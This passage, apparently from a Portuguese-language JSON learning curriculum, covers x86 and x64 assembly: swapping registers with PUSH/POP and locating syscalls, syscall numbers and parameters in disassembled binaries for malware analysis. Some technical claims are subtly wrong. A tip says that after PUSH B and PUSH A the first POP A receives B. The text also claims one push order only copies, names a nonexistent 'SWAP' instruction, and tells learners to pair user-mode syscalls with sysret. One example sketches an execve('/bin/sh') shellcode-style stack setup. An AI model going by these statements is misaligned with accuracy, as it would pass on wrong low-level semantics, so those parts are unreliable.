                                    "Confundir ordem LIFO com FIFO.",
                                    "Esquecer decremento/incremento de ESP.",
                                    "Ignorar alinhamento de 4 bytes em 32-bit."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Projetar sequência PUSH/POP para troca de registradores",
                                  "subSteps": [
                                    "Defina registradores a trocar (ex: EAX e EBX com valores iniciais 0x1234 e 0x5678).",
                                    "Simule passo a passo: PUSH EBX, PUSH EAX, POP EBX, POP EAX, rastreando stack e registradores.",
                                    "Desenhe diagrama da stack antes/depois cada instrução.",
                                    "Verifique que troca ocorreu sem sobrescrita ou perda de dados.",
                                    "Teste variações com 3 registradores para generalizar."
                                  ],
                                  "verification": "Crie diagrama manual mostrando registradores e stack pré/pós-sequência correta.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Papel e caneta",
                                    "Ferramenta de diagrama como draw.io"
                                  ],
                                  "tips": "Lembre: para trocar A e B, PUSH B primeiro, depois PUSH A, POP A (recebe B), POP B (recebe A).",
                                  "learningObjective": "Projetar sequências indiretas para operações não nativas usando stack.",
                                  "commonMistakes": [
                                    "Ordem errada de PUSH (PUSH A então B resulta em cópia, não troca).",
                                    "Esquecer de balancear PUSH/POP (stack desalinhada)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar e testar código assembly",
                                  "subSteps": [
                                    "Escreva código NASM: inicialize EAX=0x1234, EBX=0x5678, execute sequência PUSH/POP, compare valores.",
                                    "Compile com NASM e linke para executável 32-bit.",
                                    "Execute em debugger (x32dbg), defina breakpoints antes/depois sequência.",
                                    "Inspecione registradores e stack em cada breakpoint.",
                                    "Adicione prints ou syscalls para output de valores finais."
                                  ],
                                  "verification": "Debugger mostra EAX=0x5678 e EBX=0x1234 após sequência, sem crash ou desalinhamento.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "NASM",
                                    "x32dbg ou OllyDbg",
                                    "Editor como VS Code"
                                  ],
                                  "tips": "Use modo 32-bit para simplicidade; verifique flags de overflow na stack.",
                                  "learningObjective": "Implementar e depurar manipulação de stack em ambiente real.",
                                  "commonMistakes": [
                                    "Compilar em 64-bit (RIP-relative).",
                                    "Não pausar debugger para inspecionar ESP.",
                                    "Usar registradores errados como ESP diretamente."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar em análise de código binário reverso",
                                  "subSteps": [
                                    "Carregue um binário simples com essa sequência em IDA Pro ou Ghidra.",
                                    "Identifique PUSH/POP consecutivos em gráfico de disassembly.",
                                    "Renomeie como 'swap_reg_indirect' e adicione comentário explicando troca.",
                                    "Simule execução com emulador (como em IDA) para confirmar comportamento.",
                                    "Procure padrões em amostras de malware conhecidas."
                                  ],
                                  "verification": "Análise reversa identifica e explica corretamente a troca em binário desmontado.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "IDA Free ou Ghidra",
                                    "Binário de teste compilado no step 3"
                                  ],
                                  "tips": "Procure sequências de 4 instruções PUSH/POP sem outras operações intermediárias.",
                                  "learningObjective": "Reconhecer padrões de manipulação de stack em binários para análise de segurança.",
                                  "commonMistakes": [
                                    "Confundir com prologue/epilogue de funções.",
                                    "Ignorar contexto de chamadas (CALL altera stack)."
                                  ]
                                }
                              ],
                              "practicalExample": "Em assembly x86-32: mov eax, 0x12345678; mov ebx, 0x9ABCDEF0; push ebx; push eax; pop ebx; pop eax;  // Agora EAX=0x9ABCDEF0, EBX=0x12345678. Teste em debugger para ver troca.",
                              "finalVerifications": [
                                "Simula manualmente troca sem erros em stack diagram.",
                                "Executa código sem crash e confirma valores trocados em debugger.",
                                "Identifica sequência em binário reverso com explicação precisa.",
                                "Explica por que isso é útil em ofuscação (evita SWAP detectável).",
                                "Generaliza para mais de 2 registradores."
                              ],
                              "assessmentCriteria": [
                                "Precisão da sequência PUSH/POP (ordem e balanceamento).",
                                "Compreensão demonstrada via diagramas e simulações.",
                                "Habilidade em depuração e inspeção de registradores/stack.",
                                "Aplicação correta em análise reversa de binários.",
                                "Identificação de erros comuns e prevenções.",
                                "Tempo de execução alinhado com estimativas."
                              ],
                              "crossCurricularConnections": [
                                "Estruturas de Dados: Implementação prática de pilhas (stack).",
                                "Sistemas Operacionais: Gerenciamento de pilha em chamadas de função.",
                                "Programação em C: Equivalente a temporários em funções sem variáveis locais.",
                                "Criptografia: Ofuscação de código em payloads maliciosos."
                              ],
                              "realWorldApplication": "Em análise de malware e shellcode, reversar sequências PUSH/POP revela trocas de registradores para ofuscar fluxos de controle, evitando assinaturas de AV baseadas em instruções SWAP diretas; comum em exploits para manipular ponteiros indiretamente."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.5",
                    "name": "Análise de Syscalls em Código Assembly",
                    "description": "Identificação de números de syscall e parâmetros em binários desmontados.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.5.1",
                        "name": "Syscalls em Assembly x86 (32 bits)",
                        "description": "Compreensão das convenções de chamada de sistema em arquitetura x86 de 32 bits, incluindo a interrupção int 0x80 e o uso de registradores para número da syscall e parâmetros.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.5.1.1",
                            "name": "Identificar a instrução de invocação de syscall",
                            "description": "Reconhecer a instrução 'int 0x80' ou 'int 80h' em código assembly desmontado como o ponto de entrada para chamadas de sistema em x86 32 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Contexto de Syscalls em x86 32 bits",
                                  "subSteps": [
                                    "Ler documentação sobre syscalls Linux x86 32 bits, focando em interrupções de software.",
                                    "Estudar a transição de user-mode para kernel-mode via interrupções.",
                                    "Revisar registradores usados: EAX para número da syscall, EBX/ECX/etc para argumentos.",
                                    "Assistir vídeo curto explicando int 0x80 vs sysenter (para contexto histórico).",
                                    "Anotar diferenças entre x86 32 bits e 64 bits (syscall em vez de int)."
                                  ],
                                  "verification": "Resumir em 3 frases o papel da int 0x80 na invocação de syscalls.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação kernel.org sobre syscalls x86",
                                    "Vídeo YouTube: 'Linux Syscalls x86'",
                                    "Notas pessoais"
                                  ],
                                  "tips": "Foquem em por que interrupções são usadas: isolamento de privilégios.",
                                  "learningObjective": "Entender o mecanismo de interrupção para syscalls em ambientes x86 32 bits.",
                                  "commonMistakes": [
                                    "Confundir com x86-64 (usa syscall)",
                                    "Ignorar preparação de registradores antes da int"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Memorizar a Sintaxe e Variações da Instrução",
                                  "subSteps": [
                                    "Identificar formas: 'int 0x80', 'int 80h', 'int $0x80'.",
                                    "Praticar escrita manual da instrução em um editor de texto.",
                                    "Comparar com outras interrupções como int 0x21 (DOS).",
                                    "Ler opcode hexadecimal: CD 80.",
                                    "Testar em um assembler online para gerar bytes."
                                  ],
                                  "verification": "Escrever corretamente 5 variações da instrução sem olhar referência.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Referência Intel x86 manuals (online PDF)",
                                    "Assembler online como godbolt.org com assembly",
                                    "Lista de opcodes x86"
                                  ],
                                  "tips": "Lembrem: 0x80 é 128 decimal, comum em Linux.",
                                  "learningObjective": "Reconhecer todas as representações textuais e binárias da instrução de syscall.",
                                  "commonMistakes": [
                                    "Escrever 'int 80' sem 0x ou h",
                                    "Confundir com push 0x80"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Código Assembly Desmontado",
                                  "subSteps": [
                                    "Usar objdump em um binário simples como /bin/echo (32 bits).",
                                    "Identificar sequências: mov eax, N; ... ; int 0x80.",
                                    "Destacar em screenshots ou texto o padrão pré-syscall.",
                                    "Comparar com código sem syscalls (funções normais).",
                                    "Usar ferramenta como radare2 ou Ghidra demo para desmontar."
                                  ],
                                  "verification": "Anotar 3 exemplos reais de int 0x80 de binários comuns.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "/bin executáveis Linux 32 bits",
                                    "objdump ou online disassembler como onlinedisassembler.com",
                                    "Ghidra ou radare2 instalados"
                                  ],
                                  "tips": "Compile seu próprio C com -m32 para gerar binários 32 bits.",
                                  "learningObjective": "Localizar a instrução em listings desmontados reais.",
                                  "commonMistakes": [
                                    "Não filtrar por 32 bits",
                                    "Confundir int 0x80 com outras CD xx"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Identificação e Diferenciação",
                                  "subSteps": [
                                    "Resolver quiz com 10 snippets misturados (com/sem syscall).",
                                    "Criar seu próprio assembly simples com syscall e desmontar.",
                                    "Analisar malware sample conhecido com syscalls.",
                                    "Discutir em fórum ou com peer um caso real.",
                                    "Autoavaliar acurácia >90% em 20 exemplos."
                                  ],
                                  "verification": "Identificar corretamente em 10/10 snippets fornecidos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Snippets de assembly preparados (ex: pastebin)",
                                    "NASM assembler",
                                    "Malware samples benignos ou CTF challenges"
                                  ],
                                  "tips": "Procure por eax carregado logo antes.",
                                  "learningObjective": "Diferenciar int 0x80 de instruções similares em contextos variados.",
                                  "commonMistakes": [
                                    "Marcar funções de library como syscalls",
                                    "Ignorar contexto de registradores"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário desmontado de 'execve(/bin/sh)':\n\nmov    DWORD PTR [esp+4],0x0\nmov    DWORD PTR [esp],0x68732f2f\nmov    DWORD PTR [esp+8],0x6e69622f\nmov    eax,0xb  ; execve syscall number\nint    0x80     ; syscall invocation\n\nAqui, 'int 0x80' é o gatilho para a chamada ao kernel.",
                              "finalVerifications": [
                                "Localize 'int 0x80' em qualquer listing x86 32 bits.",
                                "Explique o papel dos registradores antes da instrução.",
                                "Diferencie de sysenter ou syscall em x86-64.",
                                "Identifique em binário desmontado sem ferramentas GUI.",
                                "Crie um exemplo próprio com int 0x80 funcionando."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação: 100% em exemplos padrão.",
                                "Compreensão contextual: Explica setup de args.",
                                "Velocidade: <10s por snippet após prática.",
                                "Diferenciação: Distingue de int 0x21 ou push.",
                                "Criatividade: Gera exemplos válidos."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Transição kernel-user space.",
                                "Reversing Engineering: Análise estática de binários.",
                                "Programação Assembly: Escrita e debugging de código baixo nível.",
                                "Segurança Cibernética: Detecção de syscalls em exploits.",
                                "Arquitetura de Computadores: Interrupções de hardware/software."
                              ],
                              "realWorldApplication": "Em análise forense de malware, identificar 'int 0x80' revela chamadas diretas ao kernel para ações como abrir sockets de rede, injetar código ou escalar privilégios, permitindo mitigar ameaças sem depender de strings ou APIs de alto nível."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.1.2",
                            "name": "Determinar o número da syscall",
                            "description": "Localizar e interpretar o valor carregado no registrador EAX imediatamente antes da int 0x80, mapeando-o para syscalls conhecidas como sys_exit (1) ou sys_write (4).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar a instrução de interrupção int 0x80 no código Assembly",
                                  "subSteps": [
                                    "Carregue o binário em uma ferramenta de desassembly como objdump ou Ghidra.",
                                    "Procure por padrões de código que terminem com 'int 0x80' ou 'int 80h'.",
                                    "Anote o endereço de memória onde a int 0x80 ocorre.",
                                    "Verifique o contexto ao redor para confirmar que é uma syscall Linux x86 32-bit.",
                                    "Salve uma captura de tela ou exporte o snippet relevante."
                                  ],
                                  "verification": "Confirme que a instrução int 0x80 foi encontrada e anotada com seu endereço.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Ferramenta de desassembly (objdump, Ghidra, IDA Free)",
                                    "Binário de exemplo com syscalls"
                                  ],
                                  "tips": "Use busca por string 'int 0x80' na ferramenta para agilizar.",
                                  "learningObjective": "Identificar corretamente chamadas de sistema via interrupção em Assembly x86.",
                                  "commonMistakes": [
                                    "Confundir int 0x80 com outras interrupções como int 0x21 (DOS).",
                                    "Ignorar chamadas indiretas ou ofuscadas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Examinar o registrador EAX imediatamente antes da int 0x80",
                                  "subSteps": [
                                    "Navegue para as instruções anteriores à int 0x80 (tipicamente 1-5 linhas antes).",
                                    "Identifique instruções que modificam EAX, como 'mov eax, <valor>' ou 'push <valor>; pop eax'.",
                                    "Ignore modificações em outros registradores (EBX, ECX, etc.) por enquanto.",
                                    "Marque a instrução exata que define EAX.",
                                    "Registre o opcode ou valor imediato usado."
                                  ],
                                  "verification": "A instrução que carrega EAX foi isolada e documentada.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Mesma ferramenta de desassembly",
                                    "Documentação de registradores x86"
                                  ],
                                  "tips": "EAX é o registrador de número da syscall em convenção Linux x86 32-bit; foque nele.",
                                  "learningObjective": "Compreender a convenção de chamada de syscalls onde EAX detém o número.",
                                  "commonMistakes": [
                                    "Assumir que o número está em outro registrador como EBX.",
                                    "Pular instruções condicionais que possam alterar EAX."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar o valor carregado no registrador EAX",
                                  "subSteps": [
                                    "Analise se o valor em EAX é uma constante imediata (ex: mov eax, 4).",
                                    "Se calculado (ex: add eax, 1), trace o fluxo para resolver o valor final.",
                                    "Converta valores hexadecimais para decimal se necessário (ex: 0x1 = 1).",
                                    "Verifique se há ofuscação como XOR ou rotações em EAX.",
                                    "Anote o número da syscall resolvido (ex: 4 para sys_write)."
                                  ],
                                  "verification": "O valor numérico exato em EAX foi determinado e anotado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Calculadora hexadecimal",
                                    "Debugger como GDB para execução passo a passo"
                                  ],
                                  "tips": "Use GDB com 'x/i $pc' para inspecionar dinamicamente.",
                                  "learningObjective": "Resolver valores estáticos e dinâmicos em registradores de syscall.",
                                  "commonMistakes": [
                                    "Não resolver expressões aritméticas em EAX.",
                                    "Confundir valores hex com decimal sem conversão."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Mapear o número da syscall para sua função conhecida",
                                  "subSteps": [
                                    "Consulte uma tabela de syscalls Linux x86 (ex: sys_exit=1, sys_write=4, sys_read=3).",
                                    "Busque o número anotado na tabela (use kernel.org ou man syscalls).",
                                    "Confirme parâmetros em registradores adjacentes (EBX, ECX para sys_write).",
                                    "Documente a syscall mapeada e seu propósito.",
                                    "Compare com comportamento esperado do binário."
                                  ],
                                  "verification": "Número mapeado corretamente para nome da syscall com referência à tabela.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Tabela de syscalls Linux x86 32-bit (PDF ou wiki)",
                                    "Referência man 2 syscalls"
                                  ],
                                  "tips": "Mantenha uma tabela rápida: 1=exit, 3=read, 4=write, 5=open.",
                                  "learningObjective": "Associar números de syscall a funções do sistema operacional.",
                                  "commonMistakes": [
                                    "Usar tabela errada (x64 usa syscall ao invés de int 0x80).",
                                    "Ignorar syscalls não padronizadas."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário: 'mov eax, 0x4; mov ebx, 1; mov ecx, msg; mov edx, len; int 0x80'. Aqui, EAX=4 mapeia para sys_write (escreve em stdout a mensagem 'msg').",
                              "finalVerifications": [
                                "Instrução int 0x80 localizada com endereço correto.",
                                "Valor em EAX interpretado precisamente (ex: 4).",
                                "Mapeamento correto: 4 -> sys_write.",
                                "Contexto de parâmetros verificado (EBX=stdout=1).",
                                "Sem erros de convenção x86 32-bit vs x64.",
                                "Documentação completa do processo."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação do número da syscall (100% correto).",
                                "Profundidade na análise de EAX (inclui resolução de cálculos).",
                                "Correta referência à tabela de syscalls Linux.",
                                "Clareza na documentação e anotações.",
                                "Tratamento de casos edge como ofuscação básica.",
                                "Tempo eficiente dentro dos estimados."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly x86: Entender registradores e instruções MOV/INT.",
                                "Sistemas Operacionais: Mecanismos de chamadas de sistema e tabelas de syscalls.",
                                "Segurança da Informação: Análise de malware e reverse engineering.",
                                "Engenharia de Software: Depuração com GDB e ferramentas de análise binária.",
                                "Matemática Computacional: Conversão hex/decimal e aritmética de registradores."
                              ],
                              "realWorldApplication": "Em análise forense digital e reverse engineering de malware, determinar syscalls permite identificar comportamentos maliciosos como escrita em arquivos sensíveis (sys_write) ou saída forçada (sys_exit), auxiliando na detecção de exploits em binários Linux 32-bit."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.1.3",
                            "name": "Analisar parâmetros de entrada",
                            "description": "Identificar parâmetros passados nos registradores EBX (primeiro arg), ECX (segundo), EDX (terceiro) e stack para syscalls específicas em sequências assembly.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar e identificar a chamada de syscall no código assembly",
                                  "subSteps": [
                                    "Examine o código assembly linha por linha procurando por instruções como 'int 0x80' ou 'sysenter' que indicam chamadas de sistema.",
                                    "Identifique o valor carregado no registrador EAX imediatamente antes da chamada, pois ele contém o número da syscall.",
                                    "Anote o contexto ao redor: registradores modificados antes da int/sysenter.",
                                    "Use ferramentas como objdump ou IDA Pro para visualizar o disassembly.",
                                    "Confirme se é uma syscall Linux x86 32-bit verificando a convenção (EAX = syscall num)."
                                  ],
                                  "verification": "A syscall foi localizada e o número em EAX foi anotado corretamente, comparando com documentação de syscalls (ex: sys_write = 4).",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Disassembly do binário (objdump -d binary), documentação de syscalls Linux (man syscalls ou kernel.org).",
                                  "tips": "Procure por 'mov eax, <num>' seguido de int 0x80; ignore usercalls.",
                                  "learningObjective": "Reconhecer padrões de chamadas de syscall em assembly x86 32-bit.",
                                  "commonMistakes": "Confundir com chamadas de função normais (call) ou syscalls 64-bit (syscall instr)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar parâmetros nos registradores EBX, ECX e EDX",
                                  "subSteps": [
                                    "Rastreie o que é movido para EBX antes da syscall: este é o primeiro argumento (arg1).",
                                    "Verifique ECX para o segundo argumento (arg2), tipicamente contadores ou ponteiros.",
                                    "Examine EDX para o terceiro argumento (arg3), como tamanhos ou flags.",
                                    "Use GDB para set breakpoints antes da int 0x80 e inspecione registradores com 'info registers'.",
                                    "Mapeie: EBX=arg1, ECX=arg2, EDX=arg3 conforme convenção Linux x86."
                                  ],
                                  "verification": "Liste os valores/carregamentos em EBX/ECX/EDX e confirme com syscall signature (ex: sys_write: EBX=fd, ECX=buf, EDX=len).",
                                  "estimatedTime": "30 minutos",
                                  "materials": "GDB debugger, tabela de syscalls com assinaturas (syscall.h ou online refs).",
                                  "tips": "Siga fluxos de dados backwards de EAX/EBX/ECX/EDX para fontes (variáveis, stack).",
                                  "learningObjective": "Mapear argumentos de syscall aos registradores padrão EBX/ECX/EDX.",
                                  "commonMistakes": "Ignorar pushes antes ou confundir ordem de registradores (não é stdcall)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Verificar parâmetros adicionais na stack e registradores extras",
                                  "subSteps": [
                                    "Após EBX/ECX/EDX, cheque ESI (arg4), EDI (arg5), EBP (arg6) se a syscall usar mais args.",
                                    "Inspecione a stack antes da syscall: use 'x/10x $esp' no GDB para ver pushes recentes.",
                                    "Correlacione valores na stack com args além dos primeiros três.",
                                    "Confirme alinhamento da stack (32-bit: 4-byte words).",
                                    "Documente todos args identificados vs. signature oficial da syscall."
                                  ],
                                  "verification": "Args extras em ESI/EDI/EBP ou stack foram listados e rastreados corretamente.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "GDB (run, break *addr, x/20x $esp), man pages para syscall args.",
                                  "tips": "Syscalls raramente usam >6 args; foque em comuns como open/read/write.",
                                  "learningObjective": "Identificar overflow de parâmetros para stack/registradores adicionais.",
                                  "commonMistakes": "Assumir só 3 args; ignorar stack em syscalls complexas como mmap."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e validar parâmetros para a syscall específica",
                                  "subSteps": [
                                    "Pesquise a syscall number para obter signature (ex: eax=5 -> sys_open: EBX=path, ECX=flags, EDX=mode).",
                                    "Interprete valores: strings em EBX? Ponteiros em ECX? Números em EDX?",
                                    "Simule ou trace execução para validar (GDB: continue e watch registradores).",
                                    "Anotar potenciais vulnerabilidades (ex: user-controlled buf em ECX).",
                                    "Compare com código fonte equivalente em C para confirmação."
                                  ],
                                  "verification": "Relatório completo: syscall name, args mapeados e interpretados corretamente.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Syscall table (unistd_32.h), GDB trace, C compiler para simulação.",
                                  "tips": "Use strace em binários similares para baseline de args.",
                                  "learningObjective": "Interpretar semanticamente parâmetros baseados em syscall docs.",
                                  "commonMistakes": "Interpretar raw hex como strings sem deref; ignorar endianness."
                                }
                              ],
                              "practicalExample": "Em um binário com 'mov eax,4; mov ebx,1; mov ecx,<addr_buf>; mov edx,14; int 0x80': Sys_write (4), fd=stdout(1 em EBX), buf=<addr_buf> em ECX, len=14 em EDX. Use GDB: break *sys_addr, info reg para confirmar.",
                              "finalVerifications": [
                                "Número da syscall em EAX identificado corretamente.",
                                "Parâmetros EBX/ECX/EDX mapeados e rastreados às fontes.",
                                "Args extras em stack/ESI/EDI listados se aplicável.",
                                "Interpretação semântica matches documentação oficial.",
                                "Trace em debugger reproduz valores esperados.",
                                "Relatório lista todos args com tipos/uso."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de registradores (100% match com convenção).",
                                "Completude: todos args cobertos (EBX a stack).",
                                "Profundidade de rastreamento: fontes dos valores.",
                                "Correção interpretativa: sem erros em syscall signature.",
                                "Uso efetivo de ferramentas (GDB/objdump evidenciado).",
                                "Clareza no relatório: tabelas/diagramas opcionais."
                              ],
                              "crossCurricularConnections": [
                                "Programação de Sistemas: Entender ABI Linux x86.",
                                "Reverse Engineering: Análise estática/dinâmica de binários.",
                                "Segurança: Detectar misuse de syscalls em exploits.",
                                "Arquitetura de Computadores: Registradores e convenções de chamada."
                              ],
                              "realWorldApplication": "Em análise de malware/forensics, identificar syscalls como socket() para C2 ou read() com buffers user-controlled para exploits; essencial em CTFs, pentesting e hardening de SO."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.5.2",
                        "name": "Syscalls em Assembly x64",
                        "description": "Compreensão das convenções modernas de chamada de sistema em x64, utilizando a instrução 'syscall' e registradores de acordo com a System V ABI.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.5.2.1",
                            "name": "Identificar a instrução syscall em x64",
                            "description": "Reconhecer a instrução 'syscall' em desmontagens de binários x64 como o mecanismo de invocação de chamadas de sistema.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos de Syscalls em Arquitetura x64",
                                  "subSteps": [
                                    "Estude a arquitetura x64 e o papel das syscalls como interface entre user-mode e kernel-mode.",
                                    "Aprenda que em x64 Linux/Unix, syscalls usam registradores como RAX (número da syscall), RDI/RSI/etc. para argumentos.",
                                    "Identifique que 'syscall' é a instrução específica para invocar o kernel em x64 AMD64.",
                                    "Compare com x86 (int 0x80) para destacar diferenças.",
                                    "Revise documentação oficial como o manual do Linux syscall."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito o fluxo de uma syscall em x64, incluindo registradores envolvidos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Linux syscall table (man syscall)",
                                    "PDF do Intel/AMD x64 manual (capítulo de instruções)"
                                  ],
                                  "tips": "Use diagramas para visualizar o fluxo user -> kernel.",
                                  "learningObjective": "Compreender o conceito e contexto de syscalls em x64.",
                                  "commonMistakes": [
                                    "Confundir com 'int 0x80' de x86.",
                                    "Ignorar convenções de chamadas AMD64 (System V ABI)."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Reconhecer a Sintaxe e Opcode da Instrução 'syscall'",
                                  "subSteps": [
                                    "Memorize o opcode da syscall: 0F 05.",
                                    "Analise exemplos de assembly: mov rax, 60; syscall (para exit).",
                                    "Use um disassembler como objdump para ver 'syscall' em binários compilados.",
                                    "Pratique lendo snippets de assembly isolados contendo syscall.",
                                    "Note que 'syscall' é incondicional e transfere controle ao kernel."
                                  ],
                                  "verification": "Identifique o opcode 0F 05 em um hex dump e associe à syscall.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Exemplos de código assembly x64 (NASM/GAS)",
                                    "Ferramenta objdump ou ndisasm"
                                  ],
                                  "tips": "Sempre verifique o contexto: syscall é precedida por setup de registradores.",
                                  "learningObjective": "Reconhecer visual e hexadicialmente a instrução syscall.",
                                  "commonMistakes": [
                                    "Confundir com 'sysenter' (opcode diferente: 0F 34).",
                                    "Não notar setup de RAX."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Syscall em Desmontagens de Binários Reais",
                                  "subSteps": [
                                    "Compile um programa C simples que usa printf/exit e desmonte com objdump -d.",
                                    "Localize syscalls como write (1), read (0), exit (60) pelo valor em RAX antes da syscall.",
                                    "Analise binários estáticos/dinâmicos para padrões: push/pop antes de syscall.",
                                    "Use IDA Pro/Ghidra para navegar e destacar syscalls em funções.",
                                    "Pratique em 3-5 binários diferentes (hello world, ls-like)."
                                  ],
                                  "verification": "Anote 3 instâncias de syscall em um binário desmontado com seus números de syscall.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "GCC para compilar C/assembly",
                                    "Objdump, Ghidra ou IDA Free",
                                    "Binários de teste (ex: /bin/ls)"
                                  ],
                                  "tips": "Filtre por 'syscall' no disassembler para prática rápida.",
                                  "learningObjective": "Aplicar reconhecimento em código desmontado real.",
                                  "commonMistakes": [
                                    "Ignorar syscalls indiretas via PLT.",
                                    "Confundir com chamadas de função normais (call)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Diferenciar Syscall de Instruções Semelhantes e Verificar Contextos",
                                  "subSteps": [
                                    "Compare syscall vs. sysret (retorno), int3 (breakpoint), etc.",
                                    "Analise fluxos completos: setup args -> syscall -> sysret.",
                                    "Identifique syscalls em malware samples (ex: via VirusTotal binários).",
                                    "Crie um checklist: RAX !=0? Seguida de sysret? Acesso a memória kernel?",
                                    "Teste em debugger (GDB) stepping through uma syscall."
                                  ],
                                  "verification": "Diferencie corretamente 5 snippets: 3 com syscall, 2 sem.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "GDB ou x64dbg",
                                    "Samples de malware benignos (ex: crackmes)",
                                    "Checklist template"
                                  ],
                                  "tips": "Em GDB, use 'disassemble' e 'info reg' para confirmar.",
                                  "learningObjective": "Discernir syscalls em contextos complexos.",
                                  "commonMistakes": [
                                    "Assumir toda 0F 05 é syscall sem contexto.",
                                    "Não checar sysret para pares."
                                  ]
                                }
                              ],
                              "practicalExample": "Compile este C: #include <stdio.h> int main() { printf('Hello'); return 0; } com gcc -static. Desmonte com objdump -d a.out. Localize 'syscall' após mov $0x1,%rax (write) e mov $60,%rax (exit).",
                              "finalVerifications": [
                                "Identifica 'syscall' e seu opcode em qualquer snippet x64.",
                                "Explica o número da syscall via RAX em exemplos reais.",
                                "Distingue syscall de sysenter/int em binários.",
                                "Analisa um binário completo e lista todas syscalls.",
                                "Usa debugger para step over syscall sem crash."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação (100% em testes).",
                                "Explicação correta do contexto (registradores/fluxo).",
                                "Velocidade: <2min por binário simples.",
                                "Diferenciação de instruções semelhantes.",
                                "Aplicação em cenários reais (malware/binários).",
                                "Uso correto de ferramentas (objdump/Ghidra)."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Mecanismos de chamadas kernel.",
                                "Programação Assembly: Instruções de controle x64.",
                                "Segurança da Informação: Análise de malware/reverse engineering.",
                                "Arquitetura de Computadores: Modos de operação (user/kernel)."
                              ],
                              "realWorldApplication": "Em análise forense digital e reverse engineering de malware, identificar syscalls permite mapear comportamentos como leitura de arquivos, rede ou persistência, essencial para detecção de ameaças em equipes de cibersegurança."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.5.2.2",
                            "name": "Extrair o número da syscall",
                            "description": "Ler o valor no registrador RAX antes da syscall e consultá-lo em tabelas de syscalls Linux x64, como 0 para read ou 1 para write.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de análise de Assembly x64",
                                  "subSteps": [
                                    "Instale uma ferramenta de desassembly como objdump, Ghidra ou radare2.",
                                    "Carregue um binário de exemplo Linux x64 que contenha chamadas de syscall.",
                                    "Navegue até uma seção de código com instruções syscall.",
                                    "Prepare uma tabela de syscalls Linux x64 (ex: de kernel.org ou syscalls.kernel.org).",
                                    "Verifique se o binário está em formato ELF x64."
                                  ],
                                  "verification": "Ambiente configurado e binário carregado com syscall visível na desassembly.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Ferramenta de desassembly (Ghidra/radare2/objdump)",
                                    "Tabela de syscalls Linux x64 (PDF ou site)",
                                    "Binário ELF x64 de exemplo"
                                  ],
                                  "tips": "Use binários simples como 'hello world' compilados com gcc -nostdlib para syscalls diretas.",
